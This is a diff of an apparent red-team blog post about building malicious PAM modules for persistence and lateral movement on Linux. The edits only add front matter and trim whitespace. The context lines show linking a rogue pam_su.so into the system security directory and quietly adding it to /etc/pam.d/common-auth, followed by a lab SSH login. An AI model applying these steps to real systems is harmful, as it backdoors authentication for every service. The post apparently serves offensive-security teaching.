@@ -1,4 +1,8 @@
-# Crafting Malicious Pluggable Authentication Modules for Persistence, Privilege Escalation, and Lateral Movement
+---
+layout: post
+title:  "Crafting Malicious Pluggable Authentication Modules for Persistence, Privilege Escalation, and Lateral Movement"
+tags: hacking linux authentication red-teaming
+---
 
 ## Synopsis
 
@@ -122,7 +126,7 @@ ld -x --shared -o /usr/lib/x86_64-linux-gnu/security/pam_su.so  pam_su.o
 Now that the binary is created and linked, we will edit the PAM configuration file `/etc/pam.d/common-auth` to include our malicious module. This specific file is used to define authentication-related PAM modules and settings that are common across multiple services, whether this be SSH, LDAP, or even VNC. Instead of duplicating authentication configurations in each individual service file, administrators centralize common authentication settings in this file.
 
 ```console
-root@salsa:~# vim /etc/pam.d/common-auth 
+root@salsa:~# vim /etc/pam.d/common-auth
 
 #
 # /etc/pam.d/common-auth - authentication settings common to all services
@@ -158,7 +162,7 @@ Within this file, we can inconspicuously add our optional authentication module 
 
 ```console
 ➜  ~ ssh sysadmin@10.0.0.104
-sysadmin@10.0.0.104's password: 
+sysadmin@10.0.0.104's password:
 Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-37-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
